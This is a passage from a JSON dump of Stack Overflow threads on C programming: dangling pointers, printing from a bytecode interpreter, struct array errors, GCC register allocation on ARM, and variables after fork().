output?</p>\n\n<p><strong>EDIT</strong>: Thanks for your answers: \nI ran the original code to completion in gdb, the call to puts does indeed change the data at the address where foo was stored.</p>\n\n<pre><code>(gdb) p foo\n$1 = 0x7fffffffde60 \"Aren\u2019t pointers fun?\"\n(gdb) n\n\n11      return 0;\n(gdb) p foo\n$2 = 0x7fffffffde60 \"`\\336\\377\\377\\377\\177\"\n</code></pre>\n\n<p>Interestingly, the code <strong>did</strong> print the message when I changed the code for change_msg() to:</p>\n\n<pre><code>char *get_message() {\n        char *msg = \"Aren\u2019t pointers fun?\";\n    return msg ;\n} \n</code></pre>\n\n<p>In this case, the data at foo (address 0x4005f4 - does the smaller size of the address mean anything?) remains the same throughout the code. It'd be cool to find out why this changes the behaviour</p>\n"}, {"tags": ["c", "virtual-machine", "stdout", "bytecode"], "comments": [{"owner": {"reputation": 13595, "user_id": 668501, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3f15b157200c05100d6baeb0ede510f0?s=128&d=identicon&r=PG", "display_name": "Soren", "link": "https://stackoverflow.com/users/668501/soren"}, "edited": false, "score": 0, "creation_date": 1437599225, "post_id": 31573913, "comment_id": 51102872, "body": "What do you think &#39;int 80&#39; does?"}, {"owner": {"reputation": 689, "user_id": 3403431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f58796ad71127d05d2087d690409ddb?s=128&d=identicon&r=PG&f=1", "display_name": "chapman", "link": "https://stackoverflow.com/users/3403431/chapman"}, "reply_to_user": {"reputation": 13595, "user_id": 668501, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3f15b157200c05100d6baeb0ede510f0?s=128&d=identicon&r=PG", "display_name": "Soren", "link": "https://stackoverflow.com/users/668501/soren"}, "edited": false, "score": 0, "creation_date": 1437599269, "post_id": 31573913, "comment_id": 51102895, "body": "@Soren not sure, a system call I think??"}, {"owner": {"reputation": 13595, "user_id": 668501, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3f15b157200c05100d6baeb0ede510f0?s=128&d=identicon&r=PG", "display_name": "Soren", "link": "https://stackoverflow.com/users/668501/soren"}, "edited": false, "score": 0, "creation_date": 1437599332, "post_id": 31573913, "comment_id": 51102921, "body": "So what do you think happens in that system call?"}, {"owner": {"reputation": 689, "user_id": 3403431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f58796ad71127d05d2087d690409ddb?s=128&d=identicon&r=PG&f=1", "display_name": "chapman", "link": "https://stackoverflow.com/users/3403431/chapman"}, "reply_to_user": {"reputation": 13595, "user_id": 668501, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3f15b157200c05100d6baeb0ede510f0?s=128&d=identicon&r=PG", "display_name": "Soren", "link": "https://stackoverflow.com/users/668501/soren"}, "edited": false, "score": 0, "creation_date": 1437599449, "post_id": 31573913, "comment_id": 51102981, "body": "it sends the stuff that you push to the system maybe? and the file descriptor is saying write it to stdout? im not too sure."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 1, "creation_date": 1437601251, "post_id": 31573913, "comment_id": 51103879, "body": "I guess it depends on how low-level your &quot;VM&quot; / bytecode interpreter is.  If I were writing one of these as an ordinary C program, running under an OS, I&#39;d define an opcode meaning &quot;putchar&quot;, and it would literally pop a word from the stack and call regular old <code>putchar()</code> on it, and out the character would come to my screen."}, {"owner": {"reputation": 689, "user_id": 3403431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f58796ad71127d05d2087d690409ddb?s=128&d=identicon&r=PG&f=1", "display_name": "chapman", "link": "https://stackoverflow.com/users/3403431/chapman"}, "reply_to_user": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1437698350, "post_id": 31573913, "comment_id": 51152198, "body": "@SteveSummit Good idea, I&#39;ll give that a go, thanks."}], "answers": [{"comments": [{"owner": {"reputation": 689, "user_id": 3403431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f58796ad71127d05d2087d690409ddb?s=128&d=identicon&r=PG&f=1", "display_name": "chapman", "link": "https://stackoverflow.com/users/3403431/chapman"}, "edited": false, "score": 0, "creation_date": 1437599507, "post_id": 31573991, "comment_id": 51103015, "body": "Hmm, thanks. One question though, are there any typical ways that this is approached? I don&#39;t want to &quot;reinvent the wheel&quot;."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 689, "user_id": 3403431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f58796ad71127d05d2087d690409ddb?s=128&d=identicon&r=PG&f=1", "display_name": "chapman", "link": "https://stackoverflow.com/users/3403431/chapman"}, "edited": false, "score": 0, "creation_date": 1437599663, "post_id": 31573991, "comment_id": 51103090, "body": "Video memory is a very common thing. You have to store the data displayed somewhere, right? Unless it is some kind of serial device, like a teletype, or something, where you just send one character at a time &quot;forgetting&quot; the previous. In this case you can have just a couple of control registers, either memory-mapped as well, or port-mapped (as in the x86, for example)."}, {"owner": {"reputation": 689, "user_id": 3403431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f58796ad71127d05d2087d690409ddb?s=128&d=identicon&r=PG&f=1", "display_name": "chapman", "link": "https://stackoverflow.com/users/3403431/chapman"}, "edited": false, "score": 0, "creation_date": 1437599928, "post_id": 31573991, "comment_id": 51103262, "body": "Thanks! I&#39;ll have a look into these."}], "tags": [], "owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "is_accepted": true, "score": 0, "last_activity_date": 1437599360, "last_edit_date": 1437599360, "creation_date": 1437599230, "answer_id": 31573991, "question_id": 31573913, "link": "https://stackoverflow.com/questions/31573913/how-would-you-write-to-stdout-from-a-bytecode-interpreter/31573991#31573991", "title": "How would you write to stdout from a bytecode interpreter?", "body": "<p>\"Printing\" is assuming having some kind of IO (input/output) system with an output device capable of presenting data on it (as a printer or display). On a virtual machine such a device can be only virtual as well, and it is up to the VM implementation how it would be emulated. For example it can have a specific well-defined memory range, which is the \"video memory\", such that writing there is interpreted as sending data to the output device, which can be emulated by, say, a textbox in you VM's interface. </p>\n"}, {"tags": [], "owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "is_accepted": false, "score": 0, "last_activity_date": 1437607500, "creation_date": 1437607500, "answer_id": 31575693, "question_id": 31573913, "link": "https://stackoverflow.com/questions/31573913/how-would-you-write-to-stdout-from-a-bytecode-interpreter/31575693#31575693", "title": "How would you write to stdout from a bytecode interpreter?", "body": "<p>You need to create a way for programs to access the screen - they can't do it \"automatically\".</p>\n\n<p>For example (as suggested by Eugene Sh.'s comment): create a PUTCHAR opcode, which pops a number from the stack and prints it to the screen (with the normal C function <code>putchar</code>).</p>\n"}], "owner": {"reputation": 689, "user_id": 3403431, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f58796ad71127d05d2087d690409ddb?s=128&d=identicon&r=PG&f=1", "display_name": "chapman", "link": "https://stackoverflow.com/users/3403431/chapman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 223, "favorite_count": 0, "accepted_answer_id": 31573991, "answer_count": 2, "score": -2, "last_activity_date": 1437607500, "creation_date": 1437598915, "question_id": 31573913, "link": "https://stackoverflow.com/questions/31573913/how-would-you-write-to-stdout-from-a-bytecode-interpreter", "title": "How would you write to stdout from a bytecode interpreter?", "body": "<p>I was reading this tutorial on building a simple virtual machine/bytecode interpreter. It had instructions like PUSH, POP, HALT, etc... these instructions are decoded and evaluated in a switch, so you would say if the current instruction equals PUSH, then you would push it to a stack. But what if I wanted to print out a string or character? </p>\n\n<p>In assembly, you would use make a string in <code>.data</code>, push the length, then the message, then the file descriptor for stdout (1), the system write call number so 4 (for 32 bit), and then do int 80.</p>\n\n<p>How would I do something like this for a virtual machine? Would I handle it similarly? I thought maybe I could just dump whatever I wanted to write in a register, and then printf the contents when it has something other than (magic number) in it, but that doesn't seem like a good idea.</p>\n"}, {"tags": ["c", "compiler-errors", "typedef"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1437598263, "post_id": 31573723, "comment_id": 51102382, "body": "<code>n</code> is uninitialized, so to what exactly you are trying to initialize <code>gpa</code>? Also, <code>students</code> is an array, not a struct."}, {"owner": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 4, "creation_date": 1437598430, "post_id": 31573723, "comment_id": 51102480, "body": "<code>students</code> is an array. So the assignment <code>students.gpa    =   n;</code> is not valid. You would assign an <i>element</i> of the array. For example, <code>students[0].gpa    =  4.0; &#47;&#47;assigns the first element&#39;s &quot;gpa&quot;.</code>"}, {"owner": {"reputation": 27, "user_id": 5012837, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/999292160083761/picture?type=large", "display_name": "Tommy Buzaki", "link": "https://stackoverflow.com/users/5012837/tommy-buzaki"}, "reply_to_user": {"reputation": 106438, "user_id": 1275169, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/4c6dbda4e65af6d2ceaabdfad538b319?s=128&d=identicon&r=PG&f=1", "display_name": "P.P", "link": "https://stackoverflow.com/users/1275169/p-p"}, "edited": false, "score": 0, "creation_date": 1437599610, "post_id": 31573723, "comment_id": 51103062, "body": "Gotcha @BlueMoon, so for every student I have, I have to enter the students[x student number].gpa = y gpa value. Or is there a faster way to do this? Like a loop to run through a list of values quickly or do I have to assign them all seperately? I got an error saying: expected expression before &#39;]&#39;@Eugene, the error popped up whenever I tried to use a member of the strut. I just used n for example&#39;s sake."}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "edited": false, "score": 0, "creation_date": 1437601128, "post_id": 31573723, "comment_id": 51103835, "body": "@Tommy Buzaki Have you read my answer?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437603052, "post_id": 31573723, "comment_id": 51104638, "body": "@Tommy Buzaki Rather than worry about &quot;a faster way&quot;, suggest simply starting with any way that clearly meets your functional needs.  Save optimizations for later.  To begin,use <code>student_t   students[MAXSTUDENTS] = {0};</code> to zero fill <code>students</code>."}], "answers": [{"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": true, "score": 0, "last_activity_date": 1437601089, "last_edit_date": 1437601089, "creation_date": 1437599448, "answer_id": 31574045, "question_id": 31573723, "link": "https://stackoverflow.com/questions/31573723/typedef-struct-errors-when-attempting-to-initialize-members/31574045#31574045", "title": "Typedef struct errors when attempting to initialize member(s)", "body": "<p>Variable <code>students</code> is declared as an array of elements of type <code>student_t</code></p>\n\n<pre><code>student_t   students[ MAXSTUDENTS ];\n</code></pre>\n\n<p>So to access an element of the array you should use the subscript operator as for example</p>\n\n<pre><code>students[0].gpa    =   0.0;\n</code></pre>\n\n<p>Another example can be used in function <code>print_students</code>. Though in the function it is just a pointer nevertheless you can use the same syntax with the subscript operator</p>\n\n<pre><code>void    print_students( const student_t  *students, int n )\n{\n    for ( int i = 0; i &lt; n; i++ )\n    {\n        puts( students[i].name );\n        //...\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 5012837, "user_type": "registered", "accept_rate": 50, "profile_image": "https://graph.facebook.com/999292160083761/picture?type=large", "display_name": "Tommy Buzaki", "link": "https://stackoverflow.com/users/5012837/tommy-buzaki"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "accepted_answer_id": 31574045, "answer_count": 1, "score": 1, "last_activity_date": 1437601089, "creation_date": 1437598175, "last_edit_date": 1437599866, "question_id": 31573723, "link": "https://stackoverflow.com/questions/31573723/typedef-struct-errors-when-attempting-to-initialize-members", "title": "Typedef struct errors when attempting to initialize member(s)", "body": "<p>I know the code below is not complete. I'm debugging it as I go and no matter what I do, I can't figure out why I get error: request for member 'gpa' in something not a structure or union (line 22). I'm positive there is more to be done with the code and that there are more warnings and errors, I'm not worried about those yet. Just this one I have never encountered before. </p>\n\n<pre><code>#define     _CRT_SECURE_NO_WARNINGS\n#include    &lt;stdio.h&gt;\n#include    &lt;string.h&gt;\n#define     MAXNAME        11\n#define     MAXSTUDENTS     9\n\n\ntypedef struct student\n    {\n        char    name[ MAXNAME ];\n        double  gpa;\n        char    grade;\n    }student_t;\n\nvoid    grade_students(student_t  *, int n);\nvoid    print_students(student_t  *, int n);\n\nint main()\n{\n    student_t   students[ MAXSTUDENTS ];\n    int         n;\n    students.gpa    =   n;\n    FILE        *infilep;\n\n    infilep = fopen(\"lab09.in\", \"r\");\n\n}\n</code></pre>\n\n<p>What I am trying to do is use the typedef members but when I try to follow the format used in my text and classnotes, I get the error.</p>\n"}, {"tags": ["c", "gcc", "assembly", "arm"], "comments": [{"owner": {"reputation": 12073, "user_id": 527574, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e5b251b4ac8f0cb7942587ee8077cddb?s=128&d=identicon&r=PG", "display_name": "Michael Dorgan", "link": "https://stackoverflow.com/users/527574/michael-dorgan"}, "edited": false, "score": 3, "creation_date": 1437598103, "post_id": 31573651, "comment_id": 51102280, "body": "And this was compiled -O what with what other command options?  BTW, a 2% increase in memory usage speed is wiped out by the fact you are using a O(N^2) sort..."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1437598129, "post_id": 31573651, "comment_id": 51102295, "body": "Have you tried different optimization options?"}, {"owner": {"reputation": 18029, "user_id": 3156750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73e00c291e7b746a34f28622a64f0492?s=128&d=identicon&r=PG&f=1", "display_name": "Notlikethat", "link": "https://stackoverflow.com/users/3156750/notlikethat"}, "edited": false, "score": 2, "creation_date": 1437600898, "post_id": 31573651, "comment_id": 51103721, "body": "That&#39;s <code>-O0</code> code. Even on <code>-O1</code> that whole function compiles to 21 instructions (using a Linaro 13.11 build of GCC 4.8.3). In my experience, if you mention anything about how stupid unoptimised assembly output looks to a GCC engineer, you get the response &quot;well, what did you expect?&quot; and a withering stare of disapproval."}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 0, "creation_date": 1437603040, "post_id": 31573651, "comment_id": 51104634, "body": "...not to mention, as Michael points out, the hilariously laughable exercise of optimizing a bubblesort. Like putting a spoiler on a golf cart."}, {"owner": {"reputation": 27, "user_id": 5046813, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a07eb1e160140eacad57fb592de5b6bf?s=128&d=identicon&r=PG&f=1", "display_name": "scott7950", "link": "https://stackoverflow.com/users/5046813/scott7950"}, "edited": false, "score": 0, "creation_date": 1437687278, "post_id": 31573651, "comment_id": 51148617, "body": "I didn&#39;t try different optimization options. I&#39;ll try later. Thank you."}], "answers": [{"tags": [], "owner": {"reputation": 27, "user_id": 5046813, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a07eb1e160140eacad57fb592de5b6bf?s=128&d=identicon&r=PG&f=1", "display_name": "scott7950", "link": "https://stackoverflow.com/users/5046813/scott7950"}, "is_accepted": false, "score": 2, "last_activity_date": 1438293218, "creation_date": 1438293218, "answer_id": 31734749, "question_id": 31573651, "link": "https://stackoverflow.com/questions/31573651/why-gcc-not-use-more-register-when-compiling-c-code/31734749#31734749", "title": "Why GCC not use more register when compiling C code", "body": "<p>Use optimization -O3, gcc will use more registers.</p>\n\n<pre><code>00008e10 &lt;bubble_sort&gt;:\n    8e10:   e92d0030    push    {r4, r5}\n    8e14:   e2414001    sub r4, r1, #1\n    8e18:   e3540000    cmp r4, #0\n    8e1c:   da00000d    ble 8e58 &lt;bubble_sort+0x48&gt;\n    8e20:   e080c101    add ip, r0, r1, lsl #2\n    8e24:   e2805004    add r5, r0, #4\n    8e28:   e3a00000    mov r0, #0\n    8e2c:   e1a03005    mov r3, r5\n    8e30:   e5131004    ldr r1, [r3, #-4]\n    8e34:   e4932004    ldr r2, [r3], #4\n    8e38:   e1510002    cmp r1, r2\n    8e3c:   c5031004    strgt   r1, [r3, #-4]\n    8e40:   c5032008    strgt   r2, [r3, #-8]\n    8e44:   e153000c    cmp r3, ip\n    8e48:   1afffff8    bne 8e30 &lt;bubble_sort+0x20&gt;\n    8e4c:   e2800001    add r0, r0, #1\n    8e50:   e1500004    cmp r0, r4\n    8e54:   1afffff4    bne 8e2c &lt;bubble_sort+0x1c&gt;\n    8e58:   e3a00001    mov r0, #1\n    8e5c:   e8bd0030    pop {r4, r5}\n    8e60:   e12fff1e    bx  lr\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 5046813, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a07eb1e160140eacad57fb592de5b6bf?s=128&d=identicon&r=PG&f=1", "display_name": "scott7950", "link": "https://stackoverflow.com/users/5046813/scott7950"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 281, "favorite_count": 0, "answer_count": 1, "score": -7, "last_activity_date": 1438293218, "creation_date": 1437597889, "question_id": 31573651, "link": "https://stackoverflow.com/questions/31573651/why-gcc-not-use-more-register-when-compiling-c-code", "title": "Why GCC not use more register when compiling C code", "body": "<p>When compiling C code on Ubuntu using cross platform GCC for ARM CPU, for each assembly instruction, the source data will be loaded from stack and the result will be written to stack. Why GCC not use more registers to reduce the time in load/store data?\nIs it that because ARM is load and store structure, GCC will use load/store for the data of each assembly instruction?</p>\n\n<p>The following is my bubble sort function:</p>\n\n<pre><code>bool bubble_sort(int* data, int dataSize) {\n    int i;\n    int j;\n    int dataTmp;\n\n    for(i=0; i&lt;dataSize-1; i++) {\n        for(j=0; j&lt;dataSize-1; j++) {\n            if(data[j] &gt; data[j+1]) {\n                dataTmp = data[j+1];\n                data[j+1] = data[j];\n                data[j] = dataTmp;\n            }\n        }\n    }\n    return true;\n}\n</code></pre>\n\n<p>The following is the assembly code compiled from the C code above using cross platform GCC tool on Ubuntu:</p>\n\n<pre><code>00008d0c &lt;bubble_sort&gt;:\n    8d0c:   e52db004    push    {fp}        ; (str fp, [sp, #-4]!)\n    8d10:   e28db000    add fp, sp, #0\n    8d14:   e24dd01c    sub sp, sp, #28\n    8d18:   e50b0018    str r0, [fp, #-24]\n    8d1c:   e50b101c    str r1, [fp, #-28]\n    8d20:   e3a03000    mov r3, #0\n    8d24:   e50b3010    str r3, [fp, #-16]\n    8d28:   ea000032    b   8df8 &lt;bubble_sort+0xec&gt;\n    8d2c:   e3a03000    mov r3, #0\n    8d30:   e50b300c    str r3, [fp, #-12]\n    8d34:   ea000027    b   8dd8 &lt;bubble_sort+0xcc&gt;\n    8d38:   e51b300c    ldr r3, [fp, #-12]\n    8d3c:   e1a03103    lsl r3, r3, #2\n    8d40:   e51b2018    ldr r2, [fp, #-24]\n    8d44:   e0823003    add r3, r2, r3\n    8d48:   e5932000    ldr r2, [r3]\n    8d4c:   e51b300c    ldr r3, [fp, #-12]\n    8d50:   e2833001    add r3, r3, #1\n    8d54:   e1a03103    lsl r3, r3, #2\n    8d58:   e51b1018    ldr r1, [fp, #-24]\n    8d5c:   e0813003    add r3, r1, r3\n    8d60:   e5933000    ldr r3, [r3]\n    8d64:   e1520003    cmp r2, r3\n    8d68:   da000017    ble 8dcc &lt;bubble_sort+0xc0&gt;\n    8d6c:   e51b300c    ldr r3, [fp, #-12]\n    8d70:   e2833001    add r3, r3, #1\n    8d74:   e1a03103    lsl r3, r3, #2\n    8d78:   e51b2018    ldr r2, [fp, #-24]\n    8d7c:   e0823003    add r3, r2, r3\n    8d80:   e5933000    ldr r3, [r3]\n    8d84:   e50b3008    str r3, [fp, #-8]\n    8d88:   e51b300c    ldr r3, [fp, #-12]\n    8d8c:   e2833001    add r3, r3, #1\n    8d90:   e1a03103    lsl r3, r3, #2\n    8d94:   e51b2018    ldr r2, [fp, #-24]\n    8d98:   e0823003    add r3, r2, r3\n    8d9c:   e51b200c    ldr r2, [fp, #-12]\n    8da0:   e1a02102    lsl r2, r2, #2\n    8da4:   e51b1018    ldr r1, [fp, #-24]\n    8da8:   e0812002    add r2, r1, r2\n    8dac:   e5922000    ldr r2, [r2]\n    8db0:   e5832000    str r2, [r3]\n    8db4:   e51b300c    ldr r3, [fp, #-12]\n    8db8:   e1a03103    lsl r3, r3, #2\n    8dbc:   e51b2018    ldr r2, [fp, #-24]\n    8dc0:   e0823003    add r3, r2, r3\n    8dc4:   e51b2008    ldr r2, [fp, #-8]\n    8dc8:   e5832000    str r2, [r3]\n    8dcc:   e51b300c    ldr r3, [fp, #-12]\n    8dd0:   e2833001    add r3, r3, #1\n    8dd4:   e50b300c    str r3, [fp, #-12]\n    8dd8:   e51b301c    ldr r3, [fp, #-28]\n    8ddc:   e2432001    sub r2, r3, #1\n    8de0:   e51b300c    ldr r3, [fp, #-12]\n    8de4:   e1520003    cmp r2, r3\n    8de8:   caffffd2    bgt 8d38 &lt;bubble_sort+0x2c&gt;\n    8dec:   e51b3010    ldr r3, [fp, #-16]\n    8df0:   e2833001    add r3, r3, #1\n    8df4:   e50b3010    str r3, [fp, #-16]\n    8df8:   e51b301c    ldr r3, [fp, #-28]\n    8dfc:   e2432001    sub r2, r3, #1\n    8e00:   e51b3010    ldr r3, [fp, #-16]\n    8e04:   e1520003    cmp r2, r3\n    8e08:   caffffc7    bgt 8d2c &lt;bubble_sort+0x20&gt;\n    8e0c:   e3a03001    mov r3, #1\n    8e10:   e1a00003    mov r0, r3\n    8e14:   e28bd000    add sp, fp, #0\n    8e18:   e8bd0800    ldmfd   sp!, {fp}\n    8e1c:   e12fff1e    bx  lr\n</code></pre>\n\n<p>The following is the code I wrote using inline assembly to use more registers to reduce the time in load/store:</p>\n\n<pre><code>void bubble_sort(int *data, int size) {\n    //r2 = i\n    //r3 = j\n    asm volatile(\n\"       STMDB SP!, {r0-r7}  \\n\\t\"\n\"                               \"\n\"       SUB r1, r1, #1      \\n\\t\" // r3 = size-1\n\"       LSL r1, r1, #2      \\n\\t\" // int\n\"                               \"\n\"       MOV r2, #0          \\n\\t\" // r2 = i = 0\n\"                               \"\n\"loop1:                     \\n\\t\"\n\"       CMP r2, r1          \\n\\t\" // r2 == r3: i == size-1\n\"       BEQ loop_end        \\n\\t\"  \n\"                               \"\n\"       MOV r3, #0          \\n\\t\" // r3 = j = 1\n\"       MOV r4, r0          \\n\\t\" // r4 = data\n\"       ADD r5, r4, #4      \\n\\t\" // r5 = data + 4\n\"                               \"\n\"loop2:                     \\n\\t\"\n\"       CMP r3, r1          \\n\\t\" // r3 == r1: j==size\n\"       BEQ loop1_end       \\n\\t\"  \n\"                               \"\n\"       LDR r6, [r4], #0    \\n\\t\" //data[j-1]\n\"       LDR r7, [r5], #0    \\n\\t\" //data[j]\n\"       CMP r6, r7          \\n\\t\"\n\"       BLE incr_addr       \\n\\t\"\n\"                               \"\n\"       STR r6, [r5], #4    \\n\\t\" //swp data, address + 4\n\"       STR r7, [r4], #4    \\n\\t\"\n\"       B   loop2_end       \\n\\t\"\n\"                               \"\n\"incr_addr:                 \\n\\t\"\n\"       ADD r4, r4, #4      \\n\\t\" // r4 = r4 + 4\n\"       ADD r5, r5, #4      \\n\\t\" // r5 = r5 + 4\n\"                               \"\n\"loop2_end:                 \\n\\t\"\n\"       ADD r3, r3, #4      \\n\\t\"\n\"       B   loop2           \\n\\t\"\n\"                               \"\n\"loop1_end:                 \\n\\t\"\n\"       ADD r2, r2, #4      \\n\\t\"\n\"       B   loop1           \\n\\t\"\n\"                               \"\n\"loop_end:                  \\n\\t\"\n\"                               \"\n\"       LDMIA SP!,{r0-r7}       \"\n    );\n    //back to caller\n    //\"      BX   lr              \"\n}\n</code></pre>\n"}, {"tags": ["c", "fork"], "comments": [{"owner": {"reputation": 98775, "user_id": 421195, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9a9793fdeb3b94e185c8c99c0238372f?s=128&d=identicon&r=PG", "display_name": "paulsm4", "link": "https://stackoverflow.com/users/421195/paulsm4"}, "edited": false, "score": 0, "creation_date": 1437595041, "post_id": 31572782, "comment_id": 51100408, "body": "Uh, you didn&#39;t change &quot;i&quot; until <i>after</i> the fork().  You might see the display in any order - parent first, or parent after child.  But <i>only</i> the parent will show &quot;42&quot;; the child will always be &quot;0&quot;."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437597305, "post_id": 31572782, "comment_id": 51101862, "body": "this line, after the call to fork(): &#39;if(pid)&#39; is not correct.   fork() returns a -1 when an error occurs (and they do occasionally occur).  So the code will act as if it were a successful parent when the fork() actually failed.   There are several system function calls where the return code should always be checked to assure the operation was successful.  fork() is one of those system functions.   The line would be much better as: &#39;if(pid &gt; 0)&#39;  Even better yet would be to also check if pid &lt; 0 and handle the error"}], "answers": [{"tags": [], "owner": {"reputation": 9283, "user_id": 1327005, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/b5b520280b7f71b4152579670ec5cb38?s=128&d=identicon&r=PG", "display_name": "bigOther", "link": "https://stackoverflow.com/users/1327005/bigother"}, "is_accepted": false, "score": 5, "last_activity_date": 1437595138, "creation_date": 1437595138, "answer_id": 31572866, "question_id": 31572782, "link": "https://stackoverflow.com/questions/31572782/variables-after-fork/31572866#31572866", "title": "Variables after fork", "body": "<p>When you do <code>fork()</code>, a whole process will be created including variables. So <code>i</code> in the parent is not <code>i</code> of the child. They have same virtual address but not same physical address.  The modification is completely independent.</p>\n"}, {"comments": [{"owner": {"reputation": 98775, "user_id": 421195, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/9a9793fdeb3b94e185c8c99c0238372f?s=128&d=identicon&r=PG", "display_name": "paulsm4", "link": "https://stackoverflow.com/users/421195/paulsm4"}, "edited": false, "score": 0, "creation_date": 1437700245, "post_id": 31572869, "comment_id": 51152632, "body": "@thoron - did you not realize that addresses are unique <i>per process</i>?  That 0x10000 in one process is a completely different physical address than 0x10000 in another process?  Or that &quot;logical address&quot; 0x10000 can <i>change</i> to a <i>different</i> physical address <i>while the process is running</i>?  Look here for more details: <a href=\"http://computer.howstuffworks.com/virtual-memory.htm\" rel=\"nofollow noreferrer\">computer.howstuffworks.com/virtual-memory.htm</a>"}], "tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R 